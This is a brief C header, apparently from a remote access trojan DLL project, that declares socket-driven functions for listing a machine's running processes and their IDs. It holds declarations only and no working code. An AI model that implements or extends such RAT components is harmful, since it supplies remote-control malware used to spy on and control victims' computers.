#pragma once

#define _CRT_SECURE_NO_WARNINGS

#include "RAT-Dll-Main.h"

INT handleProcessList(SOCKET clientSock);

INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out INT* numProcesses);